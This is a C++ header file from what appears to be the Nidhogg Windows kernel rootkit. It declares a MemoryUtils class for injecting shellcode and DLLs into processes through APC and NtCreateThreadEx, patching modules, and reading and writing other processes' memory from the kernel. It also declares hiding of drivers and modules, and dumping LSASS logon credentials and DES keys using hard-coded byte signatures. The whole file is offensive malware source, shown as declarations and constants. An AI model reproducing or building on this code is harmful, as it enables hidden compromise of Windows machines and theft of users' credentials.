#pragma once

#include "pch.h"
#include "MemoryHelper.hpp"

extern "C" {
	#include "WindowsTypes.hpp"
	#include "NidhoggCommon.h"
}

// Definitions.
constexpr SIZE_T MAX_HIDDEN_DRIVERS = 255;
constexpr SIZE_T ITEM_NOT_FOUND = MAX_HIDDEN_DRIVERS + 1;
constexpr SIZE_T NO_ACCESS = 0;
constexpr SIZE_T THREAD_PREVIOUSMODE_OFFSET = 0x232;
constexpr SIZE_T RETURN_OPCODE = 0xC3;
constexpr SIZE_T MOV_EAX_OPCODE = 0xB8;
constexpr SIZE_T PATH_OFFSET = 0x190;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_BIT = 0x10;
constexpr SIZE_T ALERTABLE_THREAD_FLAG_OFFSET = 0x74;
constexpr SIZE_T GUI_THREAD_FLAG_BIT = 0x80;
constexpr SIZE_T GUI_THREAD_FLAG_OFFSET = 0x78;
constexpr SIZE_T THREAD_KERNEL_STACK_OFFSET = 0x58;
constexpr SIZE_T THREAD_CONTEXT_STACK_POINTER_OFFSET = 0x2C8;
constexpr UCHAR LogonSessionListLocation[] = {0xC1, 0xE1, 0x03, 0xE8, 0xCC, 0xCC, 0xCC , 0xFF};
constexpr UCHAR IvDesKeyLocation[] = { 0x21, 0x45, 0xD4, 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x21, 0x45, 0xD8 };
constexpr UCHAR FunctionStartSignature[] = { 0x40, 0x55 };
constexpr UCHAR LogonSessionListCountSignature[] = { 0x48, 0x89, 0x45, 0xCC, 0x44, 0x8B, 0x05 };
constexpr UCHAR LogonSessionListLockSignature[] = { 0xCC, 0x8D, 0x35 };
constexpr UCHAR LogonSessionListSignature[] = { 0x48, 0x8D, 0x0D, 0xCC, 0xCC, 0xCC, 0x00, 0x8B };
constexpr UCHAR IvSignature[] = { 0x44, 0x8B, 0xC6, 0x48, 0x8D, 0x15 };
constexpr UCHAR DesKeySignature[] = { 0x44, 0x8B, 0x4D, 0xD4, 0x48, 0x8D, 0x15 };
constexpr SIZE_T LogonSessionListCountOffset = 0xB;
constexpr SIZE_T LogonSessionListLockOffset = 3;
constexpr SIZE_T LogonSessionListOffset = 3;
constexpr SIZE_T IvOffset = 6;
constexpr SIZE_T DesKeyOffset = 7;
constexpr SIZE_T DesKeyStructOffset = 0xB;
constexpr SIZE_T LsaInitializeProtectedMemoryLen = 0x310;
constexpr SIZE_T WLsaEnumerateLogonSessionLen = 0x2ad;
constexpr SIZE_T LogonSessionListLocationDistance = 0x4e730;
constexpr SIZE_T IvDesKeyLocationDistance = 0x43050;

enum InjectionType {
	APCInjection,
	NtCreateThreadExInjection
};

struct DllInformation {
	InjectionType Type;
	ULONG Pid;
	CHAR DllPath[MAX_PATH];
};

struct ShellcodeInformation {
	InjectionType Type;
	ULONG Pid;
	ULONG ShellcodeSize;
	PVOID Shellcode;
	PVOID Parameter1;
	ULONG Parameter1Size;
	PVOID Parameter2;
	ULONG Parameter2Size;
	PVOID Parameter3;
	ULONG Parameter3Size;
};

struct PatchedModule {
	ULONG Pid;
	PVOID Patch;
	ULONG PatchLength;
	CHAR* FunctionName;
	WCHAR* ModuleName;
};

struct HiddenModuleInformation {
	ULONG Pid;
	WCHAR* ModuleName;
};

struct HiddenDriverInformation {
	WCHAR* DriverName;
	bool Hide;
};

struct HiddenDriverItem {
	WCHAR* DriverName;
	PKLDR_DATA_TABLE_ENTRY originalEntry;
};

struct HiddenDriversList {
	FastMutex Lock;
	ULONG Count;
	ULONG LastIndex;
	HiddenDriverItem Items[MAX_HIDDEN_DRIVERS];
};

struct PkgReadWriteData {
	MODE Mode;
	ULONG Pid;
	SIZE_T Size;
	PVOID LocalAddress;
	PVOID RemoteAddress;
};

struct DesKeyInformation {
	ULONG Size;
	PVOID Data;
};

struct Credentials {
	UNICODE_STRING Username;
	UNICODE_STRING Domain;
	UNICODE_STRING EncryptedHash;
};

struct OutputCredentials {
	ULONG Index;
	Credentials Creds;
};

struct LsassInformation {
	FastMutex Lock;
	DesKeyInformation DesKey;
	ULONG Count;
	ULONG LastCredsIndex;
	Credentials* Creds;
};

// General functions.
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2);


class MemoryUtils {
private:
	HiddenDriversList hiddenDrivers;
	PSYSTEM_SERVICE_DESCRIPTOR_TABLE ssdt;
	tNtCreateThreadEx NtCreateThreadEx;
	LsassInformation lastLsassInfo;

	bool AddHiddenDriver(HiddenDriverItem item);
	ULONG FindHiddenDriver(HiddenDriverItem item);
	bool RemoveHiddenDriver(HiddenDriverItem item);
	bool RemoveHiddenDriver(ULONG index);
	NTSTATUS VadHideObject(PEPROCESS Process, ULONG_PTR TargetAddress);
	TABLE_SEARCH_RESULT VadFindNodeOrParent(PRTL_AVL_TABLE Table, ULONG_PTR TargetPageAddress, PRTL_BALANCED_NODE* OutNode, EX_PUSH_LOCK* PageTableCommitmentLock);
	PVOID GetModuleBase(PEPROCESS Process, WCHAR* moduleName);
	PVOID GetFunctionAddress(PVOID moduleBase, CHAR* functionName);
	NTSTATUS FindAlertableThread(HANDLE pid, PETHREAD* Thread);
	NTSTATUS GetSSDTAddress();
	PVOID GetSSDTFunctionAddress(CHAR* functionName);
	void SetCredLastIndex();

public:
	void* operator new(size_t size) {
		return AllocateMemory(size, false);
	}

	void operator delete(void* p) {
		if (p)
			ExFreePoolWithTag(p, DRIVER_TAG);
	}

	MemoryUtils();
	~MemoryUtils();

	PVOID GetFuncAddress(CHAR* functionName, WCHAR* moduleName, ULONG pid = 0);
	NTSTATUS KeWriteProcessMemory(PVOID sourceDataAddress, PEPROCESS TargetProcess, PVOID targetAddress, SIZE_T dataSize, MODE mode, bool alignAddr = true);
	NTSTATUS KeReadProcessMemory(PEPROCESS Process, PVOID sourceAddress, PVOID targetAddress, SIZE_T dataSize, MODE mode);
	NTSTATUS PatchModule(PatchedModule* ModuleInformation);
	NTSTATUS InjectShellcodeAPC(ShellcodeInformation* ShellcodeInformation, bool isInjectedDll = false);
	NTSTATUS InjectShellcodeThread(ShellcodeInformation* ShellcodeInfo);
	NTSTATUS InjectDllThread(DllInformation* DllInfo);
	NTSTATUS InjectDllAPC(DllInformation* DllInfo);
	NTSTATUS HideModule(HiddenModuleInformation* ModuleInformation);
	NTSTATUS HideDriver(HiddenDriverInformation* DriverInformation);
	NTSTATUS UnhideDriver(HiddenDriverInformation* DriverInformation);
	NTSTATUS DumpCredentials(ULONG* AllocationSize);
	NTSTATUS GetDesKey(DesKeyInformation* DesKey);
	NTSTATUS GetCredentials(OutputCredentials* Credential);

	bool FoundNtCreateThreadEx() { return NtCreateThreadEx != NULL; }
	ULONG GetHiddenDrivers() { return this->hiddenDrivers.Count; }
};

inline MemoryUtils* NidhoggMemoryUtils;
